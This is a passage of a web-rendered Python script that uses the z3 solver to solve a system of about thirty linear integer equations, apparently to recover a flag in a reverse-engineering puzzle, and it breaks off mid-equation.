class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line"><span class="meta"># for i in range(1, 32):</span></span><br><span class="line"><span class="meta">#     print(<span class="string">&#x27;x&#x27;</span> + str(i) + <span class="string">&#x27;,&#x27;</span>, end=<span class="string">&#x27;&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta"># print(&#x27;</span> = Ints(\<span class="string">&#x27;&#x27;, end=&#x27;</span><span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta"># for i in range(1, 32):</span></span></span><br><span class="line"><span class="string"><span class="meta">#     print(&#x27;</span>x<span class="string">&#x27;+str(i),end=&#x27;</span> <span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta"># print(&#x27;</span>\<span class="string">&#x27;)&#x27;</span>)</span></span><br><span class="line">x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30 = Ints(</span><br><span class="line">    <span class="string">&#x27;x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18 x19 x20 x21 x22 x23 x24 x25 x26 x27 x28 x29 x30&#x27;</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="meta"># for i in range(30):</span></span><br><span class="line"><span class="meta">#     str = input()</span></span><br><span class="line"><span class="meta">#     print(<span class="string">&#x27;solver.add(&#x27;</span>+str+<span class="string">&#x27;)&#x27;</span>)</span></span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">334</span> * x28 + <span class="number">100</span> * x27 + <span class="number">369</span> * x26 + <span class="number">124</span> * x25 + <span class="number">278</span> * x24 + <span class="number">158</span> * x23 + <span class="number">162</span> * x22 + <span class="number">145</span> * x19 + <span class="number">27</span> * x17 + <span class="number">91</span> * x15 + <span class="number">195</span> * x14 + <span class="number">342</span> * x13 + <span class="number">391</span> * x10 + <span class="number">204</span> * x9 + <span class="number">302</span> * x8 + <span class="number">153</span> * x7 + <span class="number">292</span> * x6 + <span class="number">382</span> * x5 + <span class="number">221</span> * x4 + <span class="number">316</span> * x3 + <span class="number">118</span> * x2 + <span class="number">295</span> * x1 + <span class="number">247</span> * x0 + <span class="number">236</span> * x11 + <span class="number">27</span> * x12 + <span class="number">361</span> * x16 + <span class="number">81</span> * x18 + <span class="number">105</span> * x20 + <span class="number">65</span> * x21 + <span class="number">67</span> * x29 + <span class="number">41</span> * x30 == <span class="number">596119</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">371</span> * x29 + <span class="number">338</span> * x28 + <span class="number">269</span> * x27 + <span class="number">312</span> * x26 + <span class="number">67</span> * x25 + <span class="number">299</span> * x24 + <span class="number">235</span> * x23 + <span class="number">294</span> * x22 + <span class="number">303</span> * x21 + <span class="number">211</span> * x20 + <span class="number">122</span> * x19 + <span class="number">333</span> * x18 + <span class="number">341</span> * x15 + <span class="number">111</span> * x14 + <span class="number">253</span> * x13 + <span class="number">68</span> * x12 + <span class="number">347</span> * x11 + <span class="number">44</span> * x10 + <span class="number">262</span> * x9 + <span class="number">357</span> * x8 + <span class="number">323</span> * x5 + <span class="number">141</span> * x4 + <span class="number">329</span> * x3 + <span class="number">378</span> * x2 + <span class="number">316</span> * x1 + <span class="number">235</span> * x0 + <span class="number">59</span> * x6 + <span class="number">37</span> * x7 + <span class="number">264</span> * x16 + <span class="number">73</span> * x17 + <span class="number">126</span> * x30 == <span class="number">634009</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">337</span> * x29 + <span class="number">338</span> * x28 + <span class="number">118</span> * x27 + <span class="number">82</span> * x26 + <span class="number">239</span> * x21 + <span class="number">58</span> * x20 + <span class="number">304</span> * x19 + <span class="number">330</span> * x18 + <span class="number">377</span> * x17 + <span class="number">306</span> * x16 + <span class="number">221</span> * x13 + <span class="number">345</span> * x12 + <span class="number">124</span> * x11 + <span class="number">272</span> * x10 + <span class="number">270</span> * x9 + <span class="number">229</span> * x8 + <span class="number">377</span> * x7 + <span class="number">373</span> * x6 + <span class="number">297</span> * x5 + <span class="number">112</span> * x4 + <span class="number">386</span> * x3 + <span class="number">90</span> * x2 + <span class="number">361</span> * x1 + <span class="number">236</span> * x0 + <span class="number">386</span> * x14 + <span class="number">73</span> * x15 + <span class="number">315</span> * x22 + <span class="number">33</span> * x23 + <span class="number">141</span> * x24 + <span class="number">129</span> * x25 + <span class="number">123</span> * x30 == <span class="number">685705</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">367</span> * x29 + <span class="number">55</span> * x28 + <span class="number">374</span> * x27 + <span class="number">150</span> * x24 + <span class="number">350</span> * x23 + <span class="number">141</span> * x22 + <span class="number">124</span> * x21 + <span class="number">366</span> * x20 + <span class="number">230</span> * x19 + <span class="number">307</span> * x18 + <span class="number">191</span> * x17 + <span class="number">153</span> * x12 + <span class="number">383</span> * x11 + <span class="number">145</span> * x10 + <span class="number">109</span> * x9 + <span class="number">209</span> * x8 + <span class="number">158</span> * x7 + <span class="number">221</span> * x6 + <span class="number">188</span> * x5 + <span class="number">22</span> * x4 + <span class="number">146</span> * x3 + <span class="number">306</span> * x2 + <span class="number">230</span> * x1 + <span class="number">13</span> * x0 + <span class="number">287</span> * x13 + <span class="number">257</span> * x14 + <span class="number">137</span> * x15 + <span class="number">7</span> * x16 + <span class="number">52</span> * x25 + <span class="number">31</span> * x26 + <span class="number">355</span> * x30 == <span class="number">557696</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">100</span> * x29 + <span class="number">191</span> * x28 + <span class="number">362</span> * x27 + <span class="number">55</span> * x26 + <span class="number">210</span> * x25 + <span class="number">359</span> * x24 + <span class="number">348</span> * x21 + <span class="number">83</span> * x20 + <span class="number">395</span> * x19 + <span class="number">350</span> * x16 + <span class="number">291</span> * x15 + <span class="number">220</span> * x12 + <span class="number">196</span> * x11 + <span class="number">399</span> * x8 + <span class="number">68</span> * x7 + <span class="number">84</span> * x6 + <span class="number">281</span> * x5 + <span class="number">334</span> * x4 + <span class="number">53</span> * x3 + <span class="number">399</span> * x2 + <span class="number">338</span> * x0 + <span class="number">18</span> * x1 + <span class="number">148</span> * x9 + <span class="number">21</span> * x10 + <span class="number">174</span> * x13 + <span class="number">36</span> * x14 + <span class="number">2</span> * x17 + <span class="number">41</span> * x18 + <span class="number">137</span> * x22 + <span class="number">24</span> * x23 + <span class="number">368</span> * x30 == <span class="number">538535</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">188</span> * x29 + <span class="number">128</span> * x26 + <span class="number">93</span> * x25 + <span class="number">248</span> * x24 + <span class="number">83</span> * x23 + <span class="number">207</span> * x22 + <span class="number">217</span> * x19 + <span class="number">309</span> * x16 + <span class="number">16</span> * x15 + <span class="number">135</span> * x14 + <span class="number">251</span> * x13 + <span class="number">200</span> * x12 + <span class="number">49</span> * x11 + <span class="number">119</span> * x10 + <span class="number">356</span> * x9 + <span class="number">398</span> * x8 + <span class="number">303</span> * x7 + <span class="number">224</span> * x6 + <span class="number">208</span> * x5 + <span class="number">244</span> * x4 + <span class="number">209</span> * x3 + <span class="number">189</span> * x2 + <span class="number">302</span> * x1 + <span class="number">395</span> * x0 + <span class="number">314</span> * x17 + <span class="number">13</span> * x18 + <span class="number">310</span> * x20 + <span class="number">21</span> * x21 + <span class="number">67</span> * x27 + <span class="number">127</span> * x28 + <span class="number">100</span> * x30 == <span class="number">580384</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">293</span> * x29 + <span class="number">343</span> * x28 + <span class="number">123</span> * x27 + <span class="number">387</span> * x26 + <span class="number">114</span> * x25 + <span class="number">303</span> * x24 + <span class="number">248</span> * x23 + <span class="number">258</span> * x21 + <span class="number">218</span> * x20 + <span class="number">180</span> * x19 + <span class="number">196</span> * x18 + <span class="number">398</span> * x17 + <span class="number">398</span> * x14 + <span class="number">138</span> * x9 + <span class="number">292</span> * x8 + <span class="number">38</span> * x7 + <span class="number">179</span> * x6 + <span class="number">190</span> * x5 + <span class="number">57</span> * x4 + <span class="number">358</span> * x3 + <span class="number">191</span> * x2 + <span class="number">215</span> * x1 + <span class="number">88</span> * x0 + <span class="number">22</span> * x10 + <span class="number">72</span> * x11 + <span class="number">357</span> * x12 + <span class="number">9</span> * x13 + <span class="number">389</span> * x15 + <span class="number">81</span> * x16 + <span class="number">85</span> * x30 == <span class="number">529847</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">311</span> * x29 + <span class="number">202</span> * x28 + <span class="number">234</span> * x27 + <span class="number">272</span> * x26 + <span class="number">55</span> * x25 + <span class="number">328</span> * x24 + <span class="number">246</span> * x23 + <span class="number">362</span> * x22 + <span class="number">86</span> * x21 + <span class="number">75</span> * x20 + <span class="number">142</span> * x17 + <span class="number">244</span> * x16 + <span class="number">216</span> * x15 + <span class="number">281</span> * x14 + <span class="number">398</span> * x13 + <span class="number">322</span> * x12 + <span class="number">251</span> * x11 + <span class="number">357</span> * x8 + <span class="number">76</span> * x7 + <span class="number">292</span> * x6 + <span class="number">389</span> * x5 + <span class="number">275</span> * x4 + <span class="number">312</span> * x3 + <span class="number">200</span> * x2 + <span class="number">110</span> * x1 + <span class="number">203</span> * x0 + <span class="number">99</span> * x9 + <span class="number">21</span> * x10 + <span class="number">269</span> * x18 + <span class="number">33</span> * x19 + <span class="number">356</span> * x30 == <span class="number">631652</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">261</span> * x29 + <span class="number">189</span> * x26 + <span class="number">55</span> * x25 + <span class="number">23</span> * x24 + <span class="number">202</span> * x23 + <span class="number">185</span> * x22 + <span class="number">182</span> * x21 + <span class="number">285</span> * x20 + <span class="number">217</span> * x17 + <span class="number">157</span> * x16 + <span class="number">232</span> * x15 + <span class="number">132</span> * x14 + <span class="number">169</span> * x13 + <span class="number">154</span> * x12 + <span class="number">121</span> * x11 + <span class="number">389</span> * x10 + <span class="number">376</span> * x9 + <span class="number">292</span> * x6 + <span class="number">225</span> * x5 + <span class="number">155</span> * x4 + <span class="number">234</span> * x3 + <span class="number">149</span> * x2 + <span class="number">241</span> * x1 + <span class="number">312</span> * x0 + <span class="number">368</span> * x7 + <span class="number">129</span> * x8 + <span class="number">226</span> * x18 + <span class="number">288</span> * x19 + <span class="number">201</span> * x27 + <span class="number">288</span> * x28 + <span class="number">69</span> * x30 == <span class="number">614840</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">60</span> * x29 + <span class="number">118</span> * x28 + <span class="number">153</span> * x27 + <span class="number">139</span> * x26 + <span class="number">23</span> * x25 + <span class="number">279</span> * x24 + <span class="number">396</span> * x23 + <span class="number">287</span> * x22 + <span class="number">237</span> * x19 + <span class="number">266</span> * x18 + <span class="number">149</span> * x17 + <span class="number">193</span> * x16 + <span class="number">395</span> * x15 + <span class="number">97</span> * x14 + <span class="number">16</span> * x13 + <span class="number">286</span> * x12 + <span class="number">105</span> * x11 + <span class="number">88</span> * x10 + <span class="number">282</span> * x9 + <span class="number">55</span> * x8 + <span class="number">134</span> * x7 + <span class="number">114</span> * x6 + <span class="number">101</span> * x5 + <span class="number">116</span> * x4 + <span class="number">271</span> * x3 + <span class="number">186</span> * x2 + <span class="number">263</span> * x1 + <span class="number">313</span> * x0 + <span class="number">149</span> * x20 + <span class="number">129</span> * x21 + <span class="number">145</span> * x30 == <span class="number">510398</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">385</span> * x29 + <span class="number">53</span> * x28 + <span class="number">112</span> * x27 + <span class="number">8</span> * x26 + <span class="number">232</span> * x25 + <span class="number">145</span> * x24 + <span class="number">313</span> * x23 + <span class="number">156</span> * x22 + <span class="number">321</span> * x21 + <span class="number">358</span> * x20 + <span class="number">46</span> * x19 + <span class="number">382</span> * x18 + <span class="number">144</span> * x16 + <span class="number">222</span> * x14 + <span class="number">329</span> * x13 + <span class="number">161</span> * x12 + <span class="number">335</span> * x11 + <span class="number">50</span> * x10 + <span class="number">373</span> * x9 + <span class="number">66</span> * x8 + <span class="number">44</span> * x7 + <span class="number">59</span> * x6 + <span class="number">292</span> * x5 + <span class="number">39</span> * x4 + <span class="number">53</span> * x3 + <span class="number">310</span> * x0 + <span class="number">154</span> * x1 + <span class="number">24</span> * x2 + <span class="number">396</span> * x15 + <span class="number">81</span> * x17 + <span class="number">355</span> * x30 == <span class="number">558740</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">249</span> * x29 + <span class="number">386</span> * x28 + <span class="number">313</span> * x27 + <span class="number">74</span> * x26 + <span class="number">22</span> * x25 + <span class="number">168</span> * x24 + <span class="number">305</span> * x21 + <span class="number">358</span> * x20 + <span class="number">191</span> * x19 + <span class="number">202</span> * x18 + <span class="number">14</span> * x15 + <span class="number">114</span> * x14 + <span class="number">224</span> * x13 + <span class="number">134</span> * x12 + <span class="number">274</span> * x11 + <span class="number">372</span> * x10 + <span class="number">159</span> * x9 + <span class="number">233</span> * x8 + <span class="number">70</span> * x7 + <span class="number">287</span> * x6 + <span class="number">297</span> * x5 + <span class="number">318</span> * x4 + <span class="number">177</span> * x3 + <span class="number">173</span> * x2 + <span class="number">270</span> * x1 + <span class="number">163</span> * x0 + <span class="number">77</span> * x16 + <span class="number">25</span> * x17 + <span class="number">387</span> * x22 + <span class="number">18</span> * x23 + <span class="number">345</span> * x30 == <span class="number">592365</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">392</span> * x29 + <span class="number">385</span> * x28 + <span class="number">302</span> * x27 + <span class="number">13</span> * x25 + <span class="number">27</span> * x24 + <span class="number">99</span> * x22 + <span class="number">343</span> * x19 + <span class="number">324</span> * x18 + <span class="number">223</span> * x17 + <span class="number">372</span> * x16 + <span class="number">261</span> * x15 + <span class="number">181</span> * x14 + <span class="number">203</span> * x13 + <span class="number">232</span> * x12 + <span class="number">305</span> * x11 + <span class="number">393</span> * x10 + <span class="number">325</span> * x9 + <span class="number">231</span> * x8 + <span class="number">92</span> * x7 + <span class="number">142</span> * x6 + <span class="number">22</span> * x5 + <span class="number">86</span> * x4 + <span class="number">264</span> * x3 + <span class="number">300</span> * x2 + <span class="number">387</span> * x1 + <span class="number">360</span> * x0 + <span class="number">225</span> * x20 + <span class="number">127</span> * x21 + <span class="number">2</span> * x23 + <span class="number">80</span> * x26 + <span class="number">268</span> * x30 == <span class="number">619574</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">270</span> * x28 + <span class="number">370</span> * x27 + <span class="number">235</span> * x26 + <span class="number">96</span> * x22 + <span class="number">85</span> * x20 + <span class="number">150</span> * x19 + <span class="number">140</span> * x18 + <span class="number">94</span> * x17 + <span class="number">295</span> * x16 + <span class="number">19</span> * x14 + <span class="number">176</span> * x12 + <span class="number">94</span> * x11 + <span class="number">258</span> * x10 + <span class="number">302</span> * x9 + <span class="number">171</span> * x8 + <span class="number">66</span> * x7 + <span class="number">278</span> * x6 + <span class="number">193</span> * x5 + <span class="number">251</span> * x4 + <span class="number">284</span> * x3 + <span class="number">218</span> * x2 + <span class="number">64</span> * x1 + <span class="number">319</span> * x0 + <span class="number">125</span> * x13 + <span class="number">24</span> * x15 + <span class="number">267</span> * x21 + <span class="number">160</span> * x23 + <span class="number">111</span> * x24 + <span class="number">33</span> * x25 + <span class="number">174</span> * x29 + <span class="number">13</span> * x30 == <span class="number">480557</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">87</span> * x28 + <span class="number">260</span> * x27 + <span class="number">326</span> * x26 + <span class="number">210</span> * x25 + <span class="number">357</span> * x24 + <span class="number">170</span> * x23 + <span class="number">315</span> * x22 + <span class="number">376</span> * x21 + <span class="number">227</span> * x20 + <span class="number">43</span> * x19 + <span class="number">358</span> * x18 + <span class="number">364</span> * x17 + <span class="number">309</span> * x16 + <span class="number">282</span> * x15 + <span class="number">286</span> * x14 + <span class="number">365</span> * x13 + <span class="number">287</span> * x12 + <span class="number">377</span> * x11 + <span class="number">74</span> * x10 + <span class="number">225</span> * x9 + <span class="number">328</span> * x6 + <span class="number">223</span> * x5 + <span class="number">120</span> * x4 + <span class="number">102</span> * x3 + <span class="number">162</span> * x2 + <span class="number">123</span> * x1 + <span class="number">196</span> * x0 + <span class="number">29</span> * x7 + <span class="number">27</span> * x8 + <span class="number">352</span> * x30 == <span class="number">666967</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">61</span> * x29 + <span class="number">195</span> * x28 + <span class="number">125</span> * x27 + <span class="number">64</span> * x26 + <span class="number">260</span> * x25 + <span class="number">202</span> * x24 + <span class="number">116</span> * x23 + <span class="number">230</span> * x22 + <span class="number">326</span> * x21 + <span class="number">211</span> * x20 + <span class="number">371</span> * x19 + <span class="number">353</span> * x16 + <span class="number">124</span> * x13 + <span class="number">188</span> * x12 + <span class="number">163</span> * x11 + <span class="number">140</span> * x10 + <span class="number">51</span> * x9 + <span class="number">262</span> * x8 + <span class="number">229</span> * x7 + <span class="number">100</span> * x6 + <span class="number">113</span> * x5 + <span class="number">158</span> * x4 + <span class="number">378</span> * x3 + <span class="number">365</span> * x2 + <span class="number">207</span> * x1 + <span class="number">277</span> * x0 + <span class="number">190</span> * x14 + <span class="number">320</span> * x15 + <span class="number">347</span> * x17 + <span class="number">11</span> * x18 + <span class="number">137</span> * x30 == <span class="number">590534</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">39</span> * x28 + <span class="number">303</span> * x27 + <span class="number">360</span> * x26 + <span class="number">157</span> * x25 + <span class="number">324</span> * x24 + <span class="number">77</span> * x23 + <span class="number">308</span> * x22 + <span class="number">313</span> * x21 + <span class="number">87</span> * x20 + <span class="number">201</span> * x19 + <span class="number">50</span> * x18 + <span class="number">60</span> * x17 + <span class="number">28</span> * x16 + <span class="number">193</span> * x15 + <span class="number">184</span> * x14 + <span class="number">205</span> * x13 + <span class="number">140</span> * x12 + <span class="number">311</span> * x11 + <span class="number">304</span> * x10 + <span class="number">35</span> * x9 + <span class="number">356</span> * x8 + <span class="number">23</span> * x5 + <span class="number">85</span> * x4 + <span class="number">156</span> * x3 + <span class="number">16</span> * x2 + <span class="number">26</span> * x1 + <span class="number">157</span> * x0 + <span class="number">150</span> * x6 + <span class="number">72</span> * x7 + <span class="number">58</span> * x29 == <span class="number">429108</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">157</span> * x29 + <span class="number">137</span> * x28 + <span class="number">71</span> * x27 + <span class="number">269</span> * x26 + <span class="number">161</span> * x25 + <span class="number">317</span> * x20 + <span class="number">296</span> * x19 + <span class="number">385</span> * x18 + <span class="number">165</span> * x13 + <span class="number">159</span> * x12 + <span class="number">132</span> * x11 + <span class="number">296</span> * x10 + <span class="number">162</span> * x7 + <span class="number">254</span> * x4 + <span class="number">172</span> * x3 + <span class="number">132</span> * x0 + <span class="number">369</span> * x1 + <span class="number">257</span> * x2 + <span class="number">134</span> * x5 + <span class="number">384</span> * x6 + <span class="number">53</span> * x8 + <span class="number">255</span> * x9 + <span class="number">229</span> * x14 + <span class="number">129</span> * x15 + <span class="number">23</span> * x16 + <span class="number">41</span> * x17 + <span class="number">112</span> * x21 + <span class="number">17</span> * x22 + <span class="number">222</span> * x23 + <span class="number">96</span> * x24 + <span class="number">126</span> * x30 == <span class="number">563521</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">207</span> * x29 + <span class="number">83</span> * x28 + <span class="number">111</span> * x27 + <span class="number">35</span> * x26 + <span class="number">67</span> * x25 + <span class="number">138</span> * x22 + <span class="number">223</span> * x21 + <span class="number">142</span> * x20 + <span class="number">154</span> * x19 + <span class="number">111</span> * x18 + <span class="number">341</span> * x17 + <span class="number">175</span> * x16 + <span class="number">259</span> * x15 + <span class="number">225</span> * x14 + <span class="number">26</span> * x11 + <span class="number">334</span> * x10 + <span class="number">250</span> * x7 + <span class="number">198</span> * x6 + <span class="number">279</span> * x5 + <span class="number">301</span> * x4 + <span class="number">193</span> * x3 + <span class="number">334</span> * x2 + <span class="number">134</span> * x0 + <span class="number">37</span> * x1 + <span class="number">183</span> * x8 + <span class="number">5</span> * x9 + <span class="number">270</span> * x12 + <span class="number">21</span> * x13 + <span class="number">275</span> * x23 + <span class="number">48</span> * x24 + <span class="number">163</span> * x30 == <span class="number">493999</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">393</span> * x29 + <span class="number">176</span> * x28 + <span class="number">105</span> * x27 + <span class="number">162</span> * x26 + <span class="number">148</span> * x25 + <span class="number">281</span> * x24 + <span class="number">300</span> * x23 + <span class="number">342</span> * x18 + <span class="number">262</span> * x17 + <span class="number">152</span> * x12 + <span class="number">43</span> * x11 + <span class="number">296</span> * x10 + <span class="number">273</span> * x9 + <span class="number">75</span> * x6 + <span class="number">18</span> * x4 + <span class="number">217</span> * x2 + <span class="number">132</span> * x1 + <span class="number">112</span> * x0 + <span class="number">210</span> * x3 + <span class="number">72</span> * x5 + <span class="number">113</span> * x7 + <span class="number">40</span> * x8 + <span class="number">278</span> * x13 + <span class="number">24</span> * x14 + <span class="number">77</span> * x15 + <span class="number">11</span> * x16 + <span class="number">55</span> * x19 + <span class="number">255</span> * x20 + <span class="number">241</span> * x21 + <span class="number">13</span> * x22 + <span class="number">356</span> * x30 == <span class="number">470065</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">369</span> * x29 + <span class="number">231</span> * x28 + <span class="number">285</span> * x25 + <span class="number">290</span> * x24 + <span class="number">297</span> * x23 + <span class="number">189</span> * x22 + <span class="number">390</span> * x21 + <span class="number">345</span> * x20 + <span class="number">153</span> * x19 + <span class="number">114</span> * x18 + <span class="number">251</span> * x17 + <span class="number">340</span> * x16 + <span class="number">44</span> * x15 + <span class="number">58</span> * x14 + <span class="number">335</span> * x13 + <span class="number">359</span> * x12 + <span class="number">392</span> * x11 + <span class="number">181</span> * x8 + <span class="number">103</span> * x7 + <span class="number">229</span> * x6 + <span class="number">175</span> * x5 + <span class="number">208</span> * x4 + <span class="number">92</span> * x3 + <span class="number">397</span> * x2 + <span class="number">349</span> * x1 + <span class="number">356</span> * x0 + <span class="number">64</span> * x9 + <span class="number">5</span> * x10 + <span class="number">88</span> * x26 + <span class="number">40</span> * x27 + <span class="number">295</span> * x30 == <span class="number">661276</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">341</span> * x27 + <span class="number">40</span> * x25 + <span class="number">374</span> * x23 + <span class="number">201</span> * x22 + <span class="number">77</span> * x21 + <span class="number">215</span> * x20 + <span class="number">283</span> * x19 + <span class="number">213</span> * x18 + <span class="number">392</span> * x17 + <span class="number">224</span> * x16 + <span class="number">1</span> * x15 + <span class="number">270</span> * x12 + <span class="number">28</span> * x11 + <span class="number">75</span> * x8 + <span class="number">386</span> * x7 + <span class="number">298</span> * x6 + <span class="number">170</span> * x5 + <span class="number">287</span> * x4 + <span class="number">247</span> * x3 + <span class="number">204</span> * x2 + <span class="number">103</span> * x1 + <span class="number">21</span> * x0 + <span class="number">84</span> * x9 + <span class="number">27</span> * x10 + <span class="number">159</span> * x13 + <span class="number">192</span> * x14 + <span class="number">213</span> * x24 + <span class="number">129</span> * x26 + <span class="number">67</span> * x28 + <span class="number">27</span> * x29 + <span class="number">361</span> * x30 == <span class="number">555288</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">106</span> * x29 + <span class="number">363</span> * x28 + <span class="number">210</span> * x27 + <span class="number">171</span> * x26 + <span class="number">289</span> * x25 + <span class="number">240</span> * x24 + <span class="number">164</span> * x23 + <span class="number">342</span> * x22 + <span class="number">391</span> * x19 + <span class="number">304</span> * x18 + <span class="number">218</span> * x17 + <span class="number">32</span> * x16 + <span class="number">350</span> * x15 + <span class="number">339</span> * x12 + <span class="number">303</span> * x11 + <span class="number">222</span> * x10 + <span class="number">298</span> * x9 + <span class="number">47</span> * x8 + <span class="number">48</span> * x6 + <span class="number">264</span> * x4 + <span class="number">113</span> * x3 + <span class="number">275</span> * x2 + <span class="number">345</span> * x1 + <span class="number">312</span> * x0 + <span class="number">171</span> * x5 + <span class="number">384</span> * x7 + <span class="number">175</span> * x13 + <span class="number">5</span> * x14 + <span class="number">113</span> * x20 + <span class="number">19</span> * x21 + <span class="number">263</span> * x30 == <span class="number">637650</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">278</span> * x29 + <span class="number">169</span> * x28 + <span class="number">62</span> * x27 + <span class="number">119</span> * x26 + <span class="number">385</span> * x25 + <span class="number">289</span> * x24 + <span class="number">344</span> * x23 + <span class="number">45</span> * x20 + <span class="number">308</span> * x19 + <span class="number">318</span> * x18 + <span class="number">270</span> * x17 + <span class="number">1</span> * x16 + <span class="number">323</span> * x15 + <span class="number">332</span> * x14 + <span class="number">287</span> * x11 + <span class="number">170</span> * x10 + <span class="number">163</span> * x9 + <span class="number">301</span> * x8 + <span class="number">303</span> * x7 + <span class="number">23</span> * x6 + <span class="number">327</span> * x5 + <span class="number">169</span> * x3 + <span class="number">28</span> * x0 + <span class="number">365</span> * x1 + <span class="number">15</span> * x2 + <span class="number">352</span> * x12 + <span class="number">72</span> * x13 + <span class="number">140</span> * x21 + <span class="number">65</span> * x22 + <span class="number">346</span> * x30 == <span class="number">572609</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">147</span> * x29 + <span class="number">88</span> * x28 + <span class="number">143</span> * x27 + <span class="number">237</span> * x26 + <span class="number">63</span> * x24 + <span class="number">281</span> * x22 + <span class="number">388</span> * x21 + <span class="number">142</span> * x20 + <span class="number">208</span> * x19 + <span class="number">60</span> * x18 + <span class="number">354</span> * x15 + <span class="number">88</span> * x14 + <span class="number">146</span> * x13 + <span class="number">290</span> * x12 + <span class="number">349</span> * x11 + <span class="number">43</span> * x10 + <span class="number">230</span> * x9 + <span class="number">267</span> * x6 + <span class="number">136</span> * x5 + <span class="number">383</span> * x4 + <span class="number">35</span> * x3 + <span class="number">226</span> * x2 + <span class="number">385</span> * x1 + <span class="number">238</span> * x0 + <span class="number">348</span> * x7 + <span class="number">20</span> * x8 + <span class="number">158</span> * x16 + <span class="number">21</span> * x17 + <span class="number">249</span> * x23 + <span class="number">9</span> * x25 + <span class="number">343</span> * x30 == <span class="number">603481</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">29</span> * x29 + <span class="number">323</span> * x26 + <span class="number">159</span> * x25 + <span class="number">118</span> * x20 + <span class="number">326</span> * x19 + <span class="number">211</span> * x18 + <span class="number">225</span> * x17 + <span class="number">355</span> * x16 + <span class="number">201</span> * x15 + <span class="number">149</span> * x14 + <span class="number">296</span> * x13 + <span class="number">184</span> * x12 + <span class="number">315</span> * x11 + <span class="number">364</span> * x10 + <span class="number">142</span> * x9 + <span class="number">75</span> * x8 + <span class="number">313</span> * x7 + <span class="number">142</span> * x6 + <span class="number">396</span> * x5 + <span class="number">348</span> * x4 + <span class="number">272</span> * x3 + <span class="number">26</span> * x2 + <span class="number">206</span> * x1 + <span class="number">173</span> * x0 + <span class="number">155</span> * x21 + <span class="number">144</span> * x22 + <span class="number">366</span> * x23 + <span class="number">257</span> * x24 + <span class="number">148</span> * x27 + <span class="number">24</span> * x28 + <span class="number">253</span> * x30 == <span class="number">664504</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">4</span> * x29 + <span class="number">305</span> * x28 + <span class="number">226</span> * x27 + <span class="number">212</span> * x26 + <span class="number">175</span> * x25 + <span class="number">93</span> * x24 + <span class="number">165</span> * x23 + <span class="number">341</span> * x20 + <span class="number">14</span> * x19 + <span class="number">394</span> * x18 + <span class="number">256</span> * x17 + <span class="number">252</span> * x16 + <span class="number">336</span> * x15 + <span class="number">38</span> * x14 + <span class="number">82</span> * x13 + <span class="number">155</span> * x12 + <span class="number">215</span> * x11 + <span class="number">331</span> * x10 + <span class="number">230</span> * x9 + <span class="number">241</span> * x8 + <span class="number">225</span> * x7 + <span class="number">186</span> * x4 + <span class="number">90</span> * x3 + <span class="number">50</span> * x2 + <span class="number">62</span> * x1 + <span class="number">34</span> * x0 + <span class="number">237</span> * x5 + <span class="number">11</span> * x6 + <span class="number">336</span> * x21 + <span class="number">36</span> * x22 + <span class="number">29</span> * x30 == <span class="number">473092</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">353</span> * x29 + <span class="number">216</span> * x28 + <span class="number">252</span> * x27 + <span class="number">8</span> * x26 + <span class="number">62</span> * x25 + <span class="number">233</span> * x24 + <span class="number">254</span> * x23 + <span class="number">303</span> * x22 + <span class="number">234</span> * x21 + <span class="number">303</span> * x20 + <span class="number">256</span> * x19 + <span class="number">148</span> * x18 + <span class="number">324</span> * x17 + <span class="number">317</span> * x16 + <span class="number">213</span> * x15 + <span class="number">309</span> * x14 + 